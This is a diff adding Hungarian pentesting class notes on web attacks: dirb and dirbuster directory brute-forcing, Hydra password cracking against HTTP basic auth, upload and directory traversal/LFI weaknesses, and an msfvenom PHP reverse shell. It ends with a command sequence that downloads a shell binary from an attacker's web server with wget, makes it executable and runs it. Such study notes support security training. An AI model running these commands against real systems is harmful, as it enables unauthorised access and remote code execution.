@@ -37,6 +37,48 @@ dirb <ip> <wordlist>: (órán /usr/share/wordlists/dirb/common.txt , valóságba
  -R -- interaktívan rekurzívan
  -u <username:password> -- felhasználónév/jelszó
  -x <fájl> -- kiterjesztés próbálgatás, a kiterjesztések egy fájlban listázva;
- -X <.png .jpg> -- -x-hez hasonló, itt megadjuk a kiterjesztéseket
+ -X <.png .jpg> -- -x-hez hasonló, itt megadjuk a kiterjesztéseket pl. .php <- hasznos!!
 
-BasicAuth - alap auth weben
+dirbuster
+ url, thread-ek maradhatnak, wordlist (fentebbi jó), rekurziót kivenni, lehet fájlkiterjesztéseket állítani -> results és megnézzük a kódokat, pl. 401-es kód
+ options, advanced options, authentication
+
+BasicAuth/HTTP.get auth/Post auth - alap auth weben
+
+Hydra: bármilyen jelszó feltöréséhez lehet használni
+ jelszófájl: /usr/share/wordlists/rockyou.txt
+ -l <név> vagy -L <névfájl>
+ -p <jelszó> vagy -P <jelszófájl>
+ -f -- megáll az első találatnál
+ végére meg <service>://<ip>:<port>/<elérésiútvonal> vagy <ip>:<port> <service> /<elérésiútvonal>, pl. http-get://40.0.3.12/admin ha basic auth van
+
+Weboldaloknál lehetséges sérülékenységek:
+ - feltöltési résznél ha nincs fájlkiterjesztés jól limitálva
+ - DT (Directory Traversal) letöltési résznél ha a .php fájlra hivatkozik a címsorban amit módosítani tudunk (ehhez ismerni kell a mappastruktúrát)
+   - ennek a sérülékenysége az LFI (Local File Inclusion)
+
+ha megvan a feltöltési sérülékenység:
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
+ezt feltöltjük, listenert indítunk a gépünkön, futtatjuk a feltöltött phpt, és ezután van hozzáférésünk (php shell problémái: nem mindig működik, egy idő után megszakad, és nem interaktív (pl. jelszókérésnél))
+php shell-ről továbblépés a command shell (pl. azon a shell-en letöltünk egy másik shell-t), egyetlen parancsot futtat
+command shell:
+ - php exec manual böngészőben, első example-t kimásoljuk
+   <?php
+   $output=null;
+   $retval=null;
+   exec('whoami', $output, $retval);
+   echo "Returned with status $retval and output:\n";
+   print_r($output);
+   ?>
+
+RCE (Remote Code Execution) kihasználása:
+ - előfeltételek:
+   - Attacker gépen OS shellkód készítése (nekünk linux x64)
+   - Attacker gépen listener nyitása
+   - Attacker gépen: python3 -m http.server (port) -- webszerver nyitása !!abból a mappából ahol a shellkód van!!
+ - CMD rész: (lépések között ls -l /tmp -vel tesztelhetjük a mappastruktúrát)
+   - cd /tmp -- olyan mappa ahol van jogosultságunk letölteni
+   - rm -f /tmp/shell.elf -- shell neve változhat
+   - wget http://<AttackerIP>:<előfeltétel portja, alapból 8000>/shell.elf
+   - chmod +x /tmp/shell.elf
+   - /tmp/shell.elf
